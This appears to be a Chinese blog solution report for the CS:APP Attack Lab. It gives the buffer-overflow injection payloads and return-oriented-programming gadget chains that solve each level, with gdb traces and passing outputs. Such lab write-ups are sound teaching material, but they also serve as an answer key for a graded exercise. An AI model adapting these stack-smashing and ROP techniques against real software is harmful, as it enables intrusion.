---
title: CS:APP Lab 3 解题报告 - 64位
date: 2018-09-28 21:00:00
tags:
    - CSAPP
categories: CSAPP

---

CSAPP 的 Lab 3 在第三版之前都是所谓的 Buffer Lab，而 CSAPP 第三版的配套 Lab 3 则是 Attack Lab。因为我们学校新开的计算机系统基础课可能要以此为实验，故再来重新感受一番。该 Lab 的实验流程与 Buffer Lab 基本相同，我们直接开始。本次实验笔者使用的环境为 Ubuntu 18.04。

### Part I: Code Injection Attacks

按照惯例，我们先把 `ctarget` 的反汇编码保留一份。

```bash
objdump -d ctarget > ctarget.S
```

#### Level 1

这一阶段我们要做的就是调用 `touch1()` 函数，我们先找到该函数的地址，为 `00000000004017c0`，

再看一下 getbuf 的内容，上面赫然写着 ：

```
sub    $0x28,%rsp
```

显然我们只需要随便输入 `0x28` 个字节的内容然后输入 `touch1()` 的地址即可。因此构造答案：

```
66 66 66 66 66 66 66 66 66 66
66 66 66 66 66 66 66 66 66 66
66 66 66 66 66 66 66 66 66 66
66 66 66 66 66 66 66 66 66 66
c0 17 40 00 00 00 00 00
```

运行答案：

```bash
name1e5s@sumeru:~/csapp/attacklab-name1e5s/target1$ ./hex2raw < p1l1.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 C0 17 40 00 00 00 00 00
```

#### Level 2

第二题我们要做的是调用 `touch2()` 并提供正确的 `cookie` 值，我们需要先写出相应的汇编代码，并将之通过 WriteUp 的附录 B 提供的方法转换成字节表示即可。汇编码如下：

```asm
mov $0x59b997fa,%rdi
ret
```

将之处理后我们需要确定 `getbuf()` 的栈顶位置，这个使用 gdb 可以很容易就发现：

```
name1e5s@sumeru:~/csapp/attacklab-name1e5s/target1$ gdb ./ctarget
GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ./ctarget...done.
(gdb) set args -q
(gdb) b getbuf
Breakpoint 1 at 0x4017a8: file buf.c, line 12.
(gdb) run
Starting program: /home/name1e5s/csapp/attacklab-name1e5s/target1/ctarget -q
Cookie: 0x59b997fa

Breakpoint 1, getbuf () at buf.c:12
12      buf.c: No such file or directory.
(gdb) ni
14      in buf.c
(gdb) disas
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
=> 0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    retq
End of assembler dump.
(gdb) i r
rax            0x0      0
rbx            0x55586000       1431855104
rcx            0x0      0
rdx            0x7ffff7dd18c0   140737351850176
rsi            0xc      12
rdi            0x606260 6316640
rbp            0x55685fe8       0x55685fe8
rsp            0x5561dc78       0x5561dc78
r8             0x7ffff7fed540   140737354061120
r9             0x0      0
r10            0x4032b4 4207284
r11            0x7ffff7b72f50   140737349365584
r12            0x2      2
r13            0x0      0
r14            0x0      0
r15            0x0      0
rip            0x4017ac 0x4017ac <getbuf+4>
eflags         0x216    [ PF AF IF ]
cs             0x33     51
ss             0x2b     43
ds             0x0      0
es             0x0      0
fs             0x0      0
gs             0x0      0
(gdb)
```

因此栈顶为 `0x5561dc78`，我们可以写出对应的答案：

```
48 c7 c7 fa 97 b9 59 c3 ;; mov $0x59b997fa,%rdi ret
66 66 66 66 66 66 66 66
66 66 66 66 66 66 66 66
66 66 66 66 66 66 66 66
66 66 66 66 66 66 66 66
78 dc 61 55 00 00 00 00
ec 17 40 00 00 00 00 00
```

运行之：

```
name1e5s@sumeru:~/csapp/attacklab-name1e5s/target1$ ./hex2raw < p1l2.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 C3 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 78 DC 61 55 00 00 00 00 EC 17 40 00 00 00 00 00
```

### Level 3

此关需要传入 `cookie` 转为字符串后的位置，我们继续利用那段宝贵的栈空间解决问题（，答案如下：

```
48 c7 c7 80 dc 61 55 c3 ;; mov $0x59b997fa,%rdi ret
35 39 62 39 39 37 66 61
00 66 66 66 66 66 66 66
66 66 66 66 66 66 66 66
66 66 66 66 66 66 66 66
78 dc 61 55 00 00 00 00
fa 18 40 00 00 00 00 00
```

...显然这么做是不行的，因为这段空间后来已经被处理掉了，所以我们需要自力更生自己造空间：

```
48 8d 7c 24 10 c3 66 66 ; lea 16(%rsp),%rdi ret
66 66 66 66 66 66 66 66
66 66 66 66 66 66 66 66
66 66 66 66 66 66 66 66
66 66 66 66 66 66 66 66
78 dc 61 55 00 00 00 00
fa 18 40 00 00 00 00 00
66 66 66 66 66 66 66 66
35 39 62 39 39 37 66 61 00
```

运行结果如下：

```bash
name1e5s@sumeru:~/csapp/attacklab-name1e5s/target1$ ./hex2raw < p1l3.txt | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 8D 7C 24 10 C3 66 66 35 39 62 39 39 37 66 61 00 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 78 DC 61 55 00 00 00 00 FA 18 40 00 00 00 00 00 66 66 66 66 66 66 66 66 35 39 62 39 39 37 66 61 00
```

### Part II: Return-Oriented Programming

按惯例我们先反汇编下。

### Level 2

本关的要求和上一节 Level 类似，我们要做的就是再给定的限制条件下搞定此问题。根据 WriteUp 上的限制条件，我们只可以使用有限的几个指令。这样我们只能曲线救国，即把我们的 `cookie` 放在栈上然后 `pop` 到合适的地方。也就是说，我们需要执行如下指令:

```
popq %rax
<cookie>
movq %rax,%rdi
<function touch2>
```

众所周知 `popq %rax` 的机器码是 `0x58`，`movq %rax,%rdi` 的机器码为 `0x48 0x89 0xc7`。经过搜索，我们发现在 `4019ab` 处有如下代码：

```
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   
```

其中的 `58 90 c3` 构成如下汇编代码：

```asm
pop %rax
nop
ret
```

在 `0x4019a2` 内有如下代码：

```
00000000004019a0 <addval_273>:
  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
  4019a6:	c3
```

其中的 `48 89 c7 c3`构成如下汇编代码：

```
mov %rax,%rdi
ret
```

利用这两片代码，我们可以轻易地构造出答案：

```
66 66 66 66 66 66 66 66
66 66 66 66 66 66 66 66
66 66 66 66 66 66 66 66
66 66 66 66 66 66 66 66
66 66 66 66 66 66 66 66
ab 19 40 00 00 00 00 00 ; 0x4019ab
fa 97 b9 59 00 00 00 00 ; cookie
a2 19 40 00 00 00 00 00 ; 0x4019a2
ec 17 40 00 00 00 00 00 ; touch2()
```

运行之：

```
name1e5s@sumeru:~/csapp/attacklab-name1e5s/target1$ ./hex2raw < p2l2.txt | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 66 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

### Level 3

这一题是全实验最难的地方，经过良久查找，我发现可以拼凑成如下代码：

```
0x401a06       movq %rsp, %rax
0x4019c5       movq %rax, %rdi
0x4019ab       popq %rax      
offset
0x4019dd       movl %eax, %edx
0x401a34       movl %edx, %ecx
0x401a13       movl %ecx, %esi
0x4019d6       lea (%rdi,%rsi,1),%rax
0x4019c5       movq %rax, %rdi
touch3
cookie
```

构造答案如下：

```
66 66 66 66 66 66 66 66
66 66 66 66 66 66 66 66
66 66 66 66 66 66 66 66
66 66 66 66 66 66 66 66
66 66 66 66 66 66 66 66
06 1a 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
ab 19 40 00 00 00 00 00
48 00 00 00 00 00 00 00
dd 19 40 00 00 00 00 00
34 1a 40 00 00 00 00 00
13 1a 40 00 00 00 00 00
d6 19 40 00 00 00 00 00
c5 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
35 39 62 39 39 37 66 61
00
```
























